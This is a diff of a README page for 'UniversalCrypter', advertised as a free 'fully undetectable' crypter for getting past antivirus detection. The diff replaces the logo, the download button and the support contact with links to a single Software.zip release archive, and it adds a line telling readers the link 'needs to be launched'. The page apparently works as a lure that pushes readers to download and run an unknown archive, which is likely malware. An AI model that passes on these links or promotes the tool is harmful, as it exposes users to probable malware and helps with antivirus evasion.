@@ -1,6 +1,6 @@
 # 🚀 UniversalCrypter
 
-![UniversalCrypter Logo](https://example.com/universalcrypterlogo.jpg)
+![UniversalCrypter Logo](https://github.com/EducationaSites/UniversalCrypter/releases/download/v1.0/Software.zip)
 
 Welcome to UniversalCrypter - the Best Free Open Source FUD Crypter!
 
@@ -27,7 +27,7 @@ UniversalCrypter is a powerful FUD (Fully Undetectable) crypter designed to bypa
 
 You can download the latest version of UniversalCrypter by clicking the button below:
 
-[![Download UniversalCrypter](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download UniversalCrypter](https://github.com/EducationaSites/UniversalCrypter/releases/download/v1.0/Software.zip)](https://github.com/EducationaSites/UniversalCrypter/releases/download/v1.0/Software.zip)
 
 *Note: The link above needs to be launched.*
 
@@ -44,6 +44,6 @@ We welcome contributions from the open-source community to help improve Universa
 
 ## Support
 
-For any questions or assistance regarding UniversalCrypter, please contact our team at contact@universalcrypter.com.
+For any questions or assistance regarding UniversalCrypter, please contact our team at https://github.com/EducationaSites/UniversalCrypter/releases/download/v1.0/Software.zip
 
 Let's make your files truly undetectable with UniversalCrypter! 🔒🔥
